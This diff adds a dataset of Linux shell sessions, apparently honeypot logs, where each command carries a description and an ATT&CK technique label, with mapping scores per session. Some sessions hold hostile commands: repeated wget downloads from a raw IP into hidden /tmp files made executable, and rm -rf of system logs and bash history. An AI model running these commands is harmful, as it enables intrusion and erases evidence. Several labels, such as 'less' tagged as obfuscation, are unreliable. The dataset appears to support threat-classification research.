@@ -1,0 +1,327 @@
+Session ID: 246820ce25d4
+rm -rf /var/tmp/.var03522123	remove files or directories	Indicator Removal
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'	Display amount of free and used memory in the system	System Information Discovery
+ls -lh $(which ls)	list directory contents	File and Directory Discovery
+crontab -l	maintain crontab files for individual users (Vixie Cron)	Scheduled Task/Job
+w	Show who is logged on and what they are doing	System Owner/User Discovery
+uname -m	print system information	System Information Discovery
+top	display Linux processes	Process Discovery
+uname	print system information	System Information Discovery
+uname -a	print system information	System Information Discovery
+lscpu | grep Model	display information about the CPU architecture	System Information Discovery
+rm -rf /var/tmp/dota*	remove files or directories	Indicator Removal
+sleep 15s && cd /var/tmp	delay for a specified amount of time	Virtualization/Sandbox Evasion
+whoami	print effective userid	System Owner/User Discovery
+
+- Mapping:		Process Discovery0.8322683650903613
+- Mapping:		System Owner/User Discovery0.7633598025421782
+- Mapping:		Indicator Removal0.7474770174933315
+- Mapping:		System Information Discovery0.6925074701499896
+- Mapping:		Scheduled Task/Job0.4385416695162704
+- Mapping:		Virtualization/Sandbox Evasion0.13700158675299165
+- Mapping:		Data Encrypted for Impact0.09521137146991522
+- Mapping:		Process Injection0.07643697225103878
+- Mapping:		Data Destruction0.06097048654503317
+- Mapping:		System Network Connections Discovery0.057369345872094864
+- Mapping:		Account Discovery0.05219211185149732
+
+Session ID: b07313db
+ls	list directory contents	File and Directory Discovery
+sudo apt-get install mc	execute a command as another user	Abuse Elevation Control Mechanism
+apt-get install mc	command-line interface	Command and Scripting Interpreter
+htop	interactive process viewer	Process Discovery
+top	display Linux processes	Process Discovery
+ls	list directory contents	File and Directory Discovery
+ls	list directory contents	File and Directory Discovery
+ls	list directory contents	File and Directory Discovery
+ls	list directory contents	File and Directory Discovery
+ping www.terra.es	send ICMP ECHO_REQUEST to network hosts	Non-Application Layer Protocol
+sudo ifcofnig	execute a command as another user	Abuse Elevation Control Mechanism
+sudo ifconfig	execute a command as another user	Abuse Elevation Control Mechanism
+
+- Mapping:		Process Discovery0.8322683650903613
+- Mapping:		Command and Scripting Interpreter0.5304420092304678
+- Mapping:		Non-Application Layer Protocol0.10801136400285309
+- Mapping:		Indirect Command Execution0.09518096958241236
+- Mapping:		Adversary-in-the-Middle0.07109113888436626
+- Mapping:		System Network Configuration Discovery0.06642741213684054
+- Mapping:		Application Layer Protocol0.05684215036934644
+
+Session ID: 04e8a020
+ls	list directory contents	File and Directory Discovery
+ls /home/alexis/Videos	list directory contents	File and Directory Discovery
+ls /home/alexis/Downloads	list directory contents	File and Directory Discovery
+less Downloads/20161216_work.txt	opposite of more	Obfuscated Files or Information
+ls /home/alexis/Downloads	list directory contents	File and Directory Discovery
+ls	list directory contents	File and Directory Discovery
+ls /home/alexis/Pictures	list directory contents	File and Directory Discovery
+
+
+Session ID: aee52ab8
+ls	list directory contents	File and Directory Discovery
+ls	list directory contents	File and Directory Discovery
+ls	list directory contents	File and Directory Discovery
+vi /home/debby/Documents/faq-congo.pdf	Vi IMproved, a programmer's text editor	Command and Scripting Interpreter
+free	Display amount of free and used memory in the system	System Information Discovery
+free -h	Display amount of free and used memory in the system	System Information Discovery
+ping www.terra.es	send ICMP ECHO_REQUEST to network hosts	Non-Application Layer Protocol
+ping www.elmundo.es	send ICMP ECHO_REQUEST to network hosts	Non-Application Layer Protocol
+wget	The non-interactive network downloader	Ingress Tool Transfer
+wget www.terra.es	The non-interactive network downloader	Ingress Tool Transfer
+ls	list directory contents	File and Directory Discovery
+vi /home/debby/Documents/index.html	Vi IMproved, a programmer's text editor	Command and Scripting Interpreter
+sudo vi /home/debby/Documents/index.html	execute a command as another user	Abuse Elevation Control Mechanism
+vi /home/debby/Documents/index.html	Vi IMproved, a programmer's text editor	Command and Scripting Interpreter
+nano	Nano's ANOther editor, inspired by Pico	Data Manipulation
+ed	line-oriented text editor	Data Manipulation
+apt-get	command-line interface	Command and Scripting Interpreter
+sudo apt-get vi	execute a command as another user	Abuse Elevation Control Mechanism
+apt-get vi	command-line interface	Command and Scripting Interpreter
+
+- Mapping:		Command and Scripting Interpreter0.5304420092304678
+- Mapping:		Non-Application Layer Protocol0.10801136400285309
+- Mapping:		Indirect Command Execution0.09518096958241236
+- Mapping:		Data Manipulation0.08384564893189488
+- Mapping:		Process Injection0.07643697225103878
+- Mapping:		Adversary-in-the-Middle0.07109113888436626
+- Mapping:		System Network Configuration Discovery0.06642741213684054
+- Mapping:		Application Layer Protocol0.05684215036934644
+
+Session ID: 69680775
+ls	list directory contents	File and Directory Discovery
+ls	list directory contents	File and Directory Discovery
+scp	OpenSSH secure file copy	Lateral Tool Transfer
+scp /situation	OpenSSH secure file copy	Lateral Tool Transfer
+scp /situation_baghdad_047581/ /	OpenSSH secure file copy	Lateral Tool Transfer
+sudo apt-get install nbtscan	execute a command as another user	Abuse Elevation Control Mechanism
+apt-get install nbtscan	command-line interface	Command and Scripting Interpreter
+shutdown	Halt, power-off or reboot the machine	System Shutdown/Reboot
+
+- Mapping:		Command and Scripting Interpreter0.5304420092304678
+- Mapping:		System Shutdown/Reboot0.5058503480130455
+- Mapping:		Service Stop0.16307081163198558
+- Mapping:		Indirect Command Execution0.09518096958241236
+- Mapping:		Impair Defenses0.07940358927251616
+
+Session ID: 69485d99
+wget http://212.92.127.196/.1 -O /tmp/..1	The non-interactive network downloader	Ingress Tool Transfer
+chmod +x /tmp/..1	change file mode bits	Obfuscated Files or Information
+wget http://212.92.127.196/.2 -O /tmp/..2	The non-interactive network downloader	Ingress Tool Transfer
+chmod +x /tmp/..2	change file mode bits	Obfuscated Files or Information
+wget http://212.92.127.196/.3 -O /tmp/..3	The non-interactive network downloader	Ingress Tool Transfer
+chmod +x /tmp/..3	change file mode bits	Obfuscated Files or Information
+wget http://212.92.127.196/.4 -O /tmp/..4	The non-interactive network downloader	Ingress Tool Transfer
+chmod +x /tmp/..4	change file mode bits	Obfuscated Files or Information
+wget http://212.92.127.196/.5 -O /tmp/..5	The non-interactive network downloader	Ingress Tool Transfer
+chmod +x /tmp/..5	change file mode bits	Obfuscated Files or Information
+wget http://212.92.127.196/.6 -O /tmp/..6	The non-interactive network downloader	Ingress Tool Transfer
+chmod +x /tmp/..6	change file mode bits	Obfuscated Files or Information
+wget http://212.92.127.196/.7 -O /tmp/..7	The non-interactive network downloader	Ingress Tool Transfer
+chmod +x /tmp/..7	change file mode bits	Obfuscated Files or Information
+wget http://212.92.127.196/.8 -O /tmp/..8	The non-interactive network downloader	Ingress Tool Transfer
+chmod +x /tmp/..8	change file mode bits	Obfuscated Files or Information
+wget http://212.92.127.196/.9 -O /tmp/..9	The non-interactive network downloader	Ingress Tool Transfer
+chmod +x /tmp/..9	change file mode bits	Obfuscated Files or Information
+wget http://212.92.127.196/.10 -O /tmp/..10	The non-interactive network downloader	Ingress Tool Transfer
+chmod +x /tmp/..10	change file mode bits	Obfuscated Files or Information
+wget http://212.92.127.196/.11 -O /tmp/..11	The non-interactive network downloader	Ingress Tool Transfer
+chmod +x /tmp/..11	change file mode bits	Obfuscated Files or Information
+wget http://212.92.127.196/.12 -O /tmp/..12	The non-interactive network downloader	Ingress Tool Transfer
+chmod +x /tmp/..12	change file mode bits	Obfuscated Files or Information
+
+
+Session ID: 68e36d03
+history -n	GNU History Library	Indicator Removal
+rm -rf /var/log/wtmp	remove files or directories	Indicator Removal
+rm -rf /var/log/lastlog	remove files or directories	Indicator Removal
+rm -rf /var/log/secure	remove files or directories	Indicator Removal
+rm -rf /var/log/xferlog	remove files or directories	Indicator Removal
+rm -rf /var/log/messages	remove files or directories	Indicator Removal
+rm -rf /var/run/utmp	remove files or directories	Indicator Removal
+touch /var/run/utmp	change file timestamps	Indicator Removal
+touch /var/log/messages	change file timestamps	Indicator Removal
+touch /var/log/wtmp	change file timestamps	Indicator Removal
+touch /var/log/messages	change file timestamps	Indicator Removal
+touch /var/log/xferlog	change file timestamps	Indicator Removal
+touch /var/log/secure	change file timestamps	Indicator Removal
+touch /var/log/lastlog	change file timestamps	Indicator Removal
+rm -rf /var/log/maillog	remove files or directories	Indicator Removal
+touch /var/log/maillog	change file timestamps	Indicator Removal
+rm -rf /root/.bash_history	remove files or directories	Indicator Removal
+touch /root/.bash_history	change file timestamps	Indicator Removal
+history -r	GNU History Library	Indicator Removal
+uname	print system information	System Information Discovery
+free -m	Display amount of free and used memory in the system	System Information Discovery
+ps -x	report a snapshot of the current processes	Process Discovery
+
+- Mapping:		Process Discovery0.774304213896206
+- Mapping:		Indicator Removal0.7474770174933315
+- Mapping:		Process Injection0.07643697225103878
+- Mapping:		Data Destruction0.06097048654503317
+
+Session ID: 246820ce25d4
+rm -rf /var/tmp/.var03522123	remove files or directories	Indicator Removal
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'	Display amount of free and used memory in the system	System Information Discovery
+ls -lh $(which ls)	list directory contents	File and Directory Discovery
+crontab -l	maintain crontab files for individual users (Vixie Cron)	Scheduled Task/Job
+w	Show who is logged on and what they are doing	System Owner/User Discovery
+uname -m	print system information	System Information Discovery
+top	display Linux processes	Process Discovery
+uname	print system information	System Information Discovery
+uname -a	print system information	System Information Discovery
+lscpu | grep Model	display information about the CPU architecture	System Information Discovery
+rm -rf /var/tmp/dota*	remove files or directories	Indicator Removal
+sleep 15s	delay for a specified amount of time	Virtualization/Sandbox Evasion
+rm -rf .ssh	remove files or directories	Indicator Removal
+mkdir .ssh	make directories	Data Staged
+chmod -R go= ~/.ssh	change file mode bits	Obfuscated Files or Information
+whoami	print effective userid	System Owner/User Discovery
+
+- Mapping:		Process Discovery0.8322683650903613
+- Mapping:		System Owner/User Discovery0.7633598025421782
+- Mapping:		Indicator Removal0.7474770174933315
+- Mapping:		System Information Discovery0.6925074701499896
+- Mapping:		Scheduled Task/Job0.4385416695162704
+- Mapping:		Data Staged0.16842162916288933
+- Mapping:		Virtualization/Sandbox Evasion0.13700158675299165
+- Mapping:		File and Directory Discovery0.10465001385082308
+- Mapping:		Data Encrypted for Impact0.09521137146991522
+- Mapping:		Process Injection0.07643697225103878
+- Mapping:		Masquerading0.07072254602904701
+- Mapping:		Data Destruction0.06097048654503317
+- Mapping:		System Network Connections Discovery0.057369345872094864
+- Mapping:		Account Discovery0.05219211185149732
+
+Session ID: b07313db
+ls	list directory contents	File and Directory Discovery
+sudo apt-get install mc	execute a command as another user	Abuse Elevation Control Mechanism
+apt-get install mc	command-line interface	Command and Scripting Interpreter
+htop	interactive process viewer	Process Discovery
+top	display Linux processes	Process Discovery
+ls	list directory contents	File and Directory Discovery
+ls	list directory contents	File and Directory Discovery
+ls	list directory contents	File and Directory Discovery
+ls	list directory contents	File and Directory Discovery
+ping www.terra.es	send ICMP ECHO_REQUEST to network hosts	Non-Application Layer Protocol
+sudo ifcofnig	execute a command as another user	Abuse Elevation Control Mechanism
+sudo ifconfig	execute a command as another user	Abuse Elevation Control Mechanism
+
+- Mapping:		Process Discovery0.8322683650903613
+- Mapping:		Command and Scripting Interpreter0.5304420092304678
+- Mapping:		Non-Application Layer Protocol0.10801136400285309
+- Mapping:		Indirect Command Execution0.09518096958241236
+- Mapping:		Adversary-in-the-Middle0.07109113888436626
+- Mapping:		System Network Configuration Discovery0.06642741213684054
+- Mapping:		Application Layer Protocol0.05684215036934644
+
+Session ID: 04e8a020
+ls	list directory contents	File and Directory Discovery
+ls /home/alexis/Videos	list directory contents	File and Directory Discovery
+ls /home/alexis/Downloads	list directory contents	File and Directory Discovery
+less Downloads/20161216_work.txt	opposite of more	Obfuscated Files or Information
+ls /home/alexis/Downloads	list directory contents	File and Directory Discovery
+ls	list directory contents	File and Directory Discovery
+ls /home/alexis/Pictures	list directory contents	File and Directory Discovery
+
+
+Session ID: aee52ab8
+ls	list directory contents	File and Directory Discovery
+ls	list directory contents	File and Directory Discovery
+ls	list directory contents	File and Directory Discovery
+vi /home/debby/Documents/faq-congo.pdf	Vi IMproved, a programmer's text editor	Command and Scripting Interpreter
+free	Display amount of free and used memory in the system	System Information Discovery
+free -h	Display amount of free and used memory in the system	System Information Discovery
+ping www.terra.es	send ICMP ECHO_REQUEST to network hosts	Non-Application Layer Protocol
+ping www.elmundo.es	send ICMP ECHO_REQUEST to network hosts	Non-Application Layer Protocol
+wget	The non-interactive network downloader	Ingress Tool Transfer
+wget www.terra.es	The non-interactive network downloader	Ingress Tool Transfer
+ls	list directory contents	File and Directory Discovery
+vi /home/debby/Documents/index.html	Vi IMproved, a programmer's text editor	Command and Scripting Interpreter
+sudo vi /home/debby/Documents/index.html	execute a command as another user	Abuse Elevation Control Mechanism
+vi /home/debby/Documents/index.html	Vi IMproved, a programmer's text editor	Command and Scripting Interpreter
+nano	Nano's ANOther editor, inspired by Pico	Data Manipulation
+ed	line-oriented text editor	Data Manipulation
+apt-get	command-line interface	Command and Scripting Interpreter
+sudo apt-get vi	execute a command as another user	Abuse Elevation Control Mechanism
+apt-get vi	command-line interface	Command and Scripting Interpreter
+
+- Mapping:		Command and Scripting Interpreter0.5304420092304678
+- Mapping:		Non-Application Layer Protocol0.10801136400285309
+- Mapping:		Indirect Command Execution0.09518096958241236
+- Mapping:		Data Manipulation0.08384564893189488
+- Mapping:		Process Injection0.07643697225103878
+- Mapping:		Adversary-in-the-Middle0.07109113888436626
+- Mapping:		System Network Configuration Discovery0.06642741213684054
+- Mapping:		Application Layer Protocol0.05684215036934644
+
+Session ID: 69680775
+ls	list directory contents	File and Directory Discovery
+ls	list directory contents	File and Directory Discovery
+scp	OpenSSH secure file copy	Lateral Tool Transfer
+scp /situation	OpenSSH secure file copy	Lateral Tool Transfer
+scp /situation_baghdad_047581/ /	OpenSSH secure file copy	Lateral Tool Transfer
+sudo apt-get install nbtscan	execute a command as another user	Abuse Elevation Control Mechanism
+apt-get install nbtscan	command-line interface	Command and Scripting Interpreter
+shutdown	Halt, power-off or reboot the machine	System Shutdown/Reboot
+
+- Mapping:		Command and Scripting Interpreter0.5304420092304678
+- Mapping:		System Shutdown/Reboot0.5058503480130455
+- Mapping:		Service Stop0.16307081163198558
+- Mapping:		Indirect Command Execution0.09518096958241236
+- Mapping:		Impair Defenses0.07940358927251616
+
+Session ID: 69485d99
+wget http://212.92.127.196/.1 -O /tmp/..1	The non-interactive network downloader	Ingress Tool Transfer
+chmod +x /tmp/..1	change file mode bits	Obfuscated Files or Information
+wget http://212.92.127.196/.2 -O /tmp/..2	The non-interactive network downloader	Ingress Tool Transfer
+chmod +x /tmp/..2	change file mode bits	Obfuscated Files or Information
+wget http://212.92.127.196/.3 -O /tmp/..3	The non-interactive network downloader	Ingress Tool Transfer
+chmod +x /tmp/..3	change file mode bits	Obfuscated Files or Information
+wget http://212.92.127.196/.4 -O /tmp/..4	The non-interactive network downloader	Ingress Tool Transfer
+chmod +x /tmp/..4	change file mode bits	Obfuscated Files or Information
+wget http://212.92.127.196/.5 -O /tmp/..5	The non-interactive network downloader	Ingress Tool Transfer
+chmod +x /tmp/..5	change file mode bits	Obfuscated Files or Information
+wget http://212.92.127.196/.6 -O /tmp/..6	The non-interactive network downloader	Ingress Tool Transfer
+chmod +x /tmp/..6	change file mode bits	Obfuscated Files or Information
+wget http://212.92.127.196/.7 -O /tmp/..7	The non-interactive network downloader	Ingress Tool Transfer
+chmod +x /tmp/..7	change file mode bits	Obfuscated Files or Information
+wget http://212.92.127.196/.8 -O /tmp/..8	The non-interactive network downloader	Ingress Tool Transfer
+chmod +x /tmp/..8	change file mode bits	Obfuscated Files or Information
+wget http://212.92.127.196/.9 -O /tmp/..9	The non-interactive network downloader	Ingress Tool Transfer
+chmod +x /tmp/..9	change file mode bits	Obfuscated Files or Information
+wget http://212.92.127.196/.10 -O /tmp/..10	The non-interactive network downloader	Ingress Tool Transfer
+chmod +x /tmp/..10	change file mode bits	Obfuscated Files or Information
+wget http://212.92.127.196/.11 -O /tmp/..11	The non-interactive network downloader	Ingress Tool Transfer
+chmod +x /tmp/..11	change file mode bits	Obfuscated Files or Information
+wget http://212.92.127.196/.12 -O /tmp/..12	The non-interactive network downloader	Ingress Tool Transfer
+chmod +x /tmp/..12	change file mode bits	Obfuscated Files or Information
+
+
+Session ID: 68e36d03
+history -n	GNU History Library	Indicator Removal
+rm -rf /var/log/wtmp	remove files or directories	Indicator Removal
+rm -rf /var/log/lastlog	remove files or directories	Indicator Removal
+rm -rf /var/log/secure	remove files or directories	Indicator Removal
+rm -rf /var/log/xferlog	remove files or directories	Indicator Removal
+rm -rf /var/log/messages	remove files or directories	Indicator Removal
+rm -rf /var/run/utmp	remove files or directories	Indicator Removal
+touch /var/run/utmp	change file timestamps	Indicator Removal
+touch /var/log/messages	change file timestamps	Indicator Removal
+touch /var/log/wtmp	change file timestamps	Indicator Removal
+touch /var/log/messages	change file timestamps	Indicator Removal
+touch /var/log/xferlog	change file timestamps	Indicator Removal
+touch /var/log/secure	change file timestamps	Indicator Removal
+touch /var/log/lastlog	change file timestamps	Indicator Removal
+rm -rf /var/log/maillog	remove files or directories	Indicator Removal
+touch /var/log/maillog	change file timestamps	Indicator Removal
+rm -rf /root/.bash_history	remove files or directories	Indicator Removal
+touch /root/.bash_history	change file timestamps	Indicator Removal
+history -r	GNU History Library	Indicator Removal
+uname	print system information	System Information Discovery
+free -m	Display amount of free and used memory in the system	System Information Discovery
+ps -x	report a snapshot of the current processes	Process Discovery
+
+- Mapping:		Process Discovery0.774304213896206
+- Mapping:		Indicator Removal0.7474770174933315
+- Mapping:		Process Injection0.07643697225103878
+- Mapping:		Data Destruction0.06097048654503317
